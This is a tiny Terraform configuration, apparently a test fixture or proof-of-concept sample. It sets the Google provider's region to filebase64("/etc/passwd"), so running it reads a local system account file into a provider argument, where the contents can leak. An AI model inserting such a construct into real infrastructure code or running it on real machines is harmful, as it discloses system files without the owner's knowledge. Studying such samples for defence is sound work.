

provider "google" {
  region = filebase64("/etc/passwd")
}
